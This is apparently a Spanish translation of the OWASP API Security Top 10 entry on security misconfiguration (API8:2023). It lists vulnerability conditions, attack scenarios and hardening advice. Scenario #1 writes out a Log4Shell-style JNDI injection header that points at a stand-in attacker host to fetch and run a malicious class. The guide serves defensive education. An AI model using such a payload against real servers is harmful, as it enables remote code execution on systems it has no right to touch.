# API8:2023 Configuración de Seguridad Incorrecta

| Agentes de amenaza/Vectores de ataque | Debilidad de seguridad | Impactos |
| - | - | - |
| Específico de API: Explotabilidad **Fácil** | Prevalencia **Generalizada** : Detectabilidad **Fácil** | Técnico **Grave** : Específico del negocio |
| Los atacantes suelen intentar encontrar fallas sin parches, endpoints comunes, servicios que se ejecutan con configuraciones predeterminadas inseguras o archivos y directorios sin protección para obtener acceso no autorizado o conocimiento del sistema. Gran parte de esto es conocimiento público y pueden existir exploits disponibles. | La configuración incorrecta de seguridad puede ocurrir en cualquier nivel del stack de la API, desde el nivel de red hasta el nivel de aplicación. Existen herramientas automatizadas para detectar y explotar configuraciones incorrectas como servicios innecesarios u opciones heredadas. | Las configuraciones incorrectas de seguridad no solo exponen datos sensibles de usuarios, sino también detalles del sistema que pueden llevar al compromiso total del servidor. |

## ¿Es vulnerable la API?

La API puede ser vulnerable si:

* Falta el endurecimiento de seguridad en cualquier parte del stack de la API o si hay permisos mal configurados en servicios en la nube.  
* Faltan los últimos parches de seguridad o los sistemas están desactualizados.  
* Están habilitadas características innecesarias (p. ej., verbos HTTP, funciones de registro).  
* Existen discrepancias en la forma en que los servidores procesan las solicitudes entrantes en la cadena de servidores HTTP.  
* Falta la capa de seguridad de transporte (TLS).  
* No se envían directivas de seguridad o control de caché a los clientes.  
* Falta una política de *Cross-Origin Resource Sharing (CORS)* o está configurada de manera incorrecta.  
* Los mensajes de error incluyen trazas de pila o exponen otra información sensible.  

## Ejemplos de Escenarios de Ataque

### Escenario #1

Un servidor back-end de API mantiene un registro de accesos mediante una utilidad de registro de terceros de código abierto popular, con soporte para expansión de *placeholders* y búsquedas JNDI (Java Naming and Directory Interface), ambas habilitadas de forma predeterminada. Por cada solicitud, se escribe una nueva entrada en el archivo de registro con el siguiente patrón: `<method> <api_version>/<path> - <status_code>`.

Un actor malicioso envía la siguiente solicitud API, que se escribe en el archivo de registro:  

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Debido a la configuración predeterminada insegura de la utilidad de registro y a una política de red de salida permisiva, al escribir la entrada correspondiente en el registro de accesos, mientras expande el valor en la cabecera `X-Api-Version`, la utilidad de registro descargará y ejecutará el objeto `Malicious.class` desde el servidor controlado por el atacante.  

### Escenario #2

Un sitio de red social ofrece una función de "Mensajes Directos" que permite a los usuarios mantener conversaciones privadas. Para recuperar nuevos mensajes de una conversación específica, el sitio emite la siguiente solicitud API (no se requiere interacción del usuario):  

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Debido a que la respuesta de la API no incluye la cabecera HTTP `Cache-Control`, las conversaciones privadas terminan almacenadas en caché por el navegador web, lo que permite a actores maliciosos recuperarlas de los archivos de caché del navegador en el sistema de archivos.  

## Cómo Prevenir

El ciclo de vida de la API debe incluir:

* Un proceso repetible de endurecimiento que permita el despliegue rápido y sencillo de un entorno correctamente asegurado.  
* Una tarea para revisar y actualizar configuraciones en todo el stack de la API. La revisión debe incluir: archivos de orquestación, componentes de la API y servicios en la nube (p. ej., permisos de buckets S3).  
* Un proceso automatizado para evaluar continuamente la efectividad de la configuración y ajustes en todos los entornos.  

Además:  

* Asegúrate de que todas las comunicaciones entre el cliente y el servidor de la API, y cualquier componente descendente/ascendente, ocurran sobre un canal de comunicación cifrado (TLS), sin importar si es una API interna o pública.  
* Sé específico sobre qué verbos HTTP puede usar cada API: todos los demás verbos HTTP deben estar deshabilitados (p. ej., HEAD).  
* Las APIs que esperan ser accedidas desde clientes basados en navegador (p. ej., frontend web) deben al menos:  
  * Implementar una política adecuada de *Cross-Origin Resource Sharing (CORS)*.  
  * Incluir cabeceras de seguridad aplicables.  
* Restringe los tipos de contenido/formatos de datos entrantes a aquellos que cumplan con los requisitos funcionales del negocio.  
* Asegúrate de que todos los servidores en la cadena HTTP (p. ej., balanceadores de carga, proxies directos/inversos y servidores backend) procesen las solicitudes entrantes de manera uniforme para evitar problemas de desincronización.  
* Cuando sea aplicable, define y aplica todos los esquemas de payload de respuesta de la API, incluidas las respuestas de error, para evitar que trazas de excepción u otra información valiosa se devuelva a los atacantes.  

## Referencias

### OWASP

* [OWASP Secure Headers Project][1]  
* [Configuration and Deployment Management Testing - Web Security Testing Guide][2]  
* [Testing for Error Handling - Web Security Testing Guide][3]  
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]  

### Externas

* [CWE-2: Environmental Security Flaws][5]  
* [CWE-16: Configuration][6]  
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]  
* [CWE-319: Cleartext Transmission of Sensitive Information][8]  
* [CWE-388: Error Handling][9]  
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')][10]  
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]  
* [Guide to General Server Security][12], NIST  
* [Let's Encrypt: una autoridad certificadora gratuita, automatizada y abierta][13]  

[1]: https://owasp.org/www-project-secure-headers/  
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README  
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README  
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery  
[5]: https://cwe.mitre.org/data/definitions/2.html  
[6]: https://cwe.mitre.org/data/definitions/16.html  
[7]: https://cwe.mitre.org/data/definitions/209.html  
[8]: https://cwe.mitre.org/data/definitions/319.html  
[9]: https://cwe.mitre.org/data/definitions/388.html  
[10]: https://cwe.mitre.org/data/definitions/444.html  
[11]: https://cwe.mitre.org/data/definitions/942.html  
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final  
[13]: https://letsencrypt.org/  
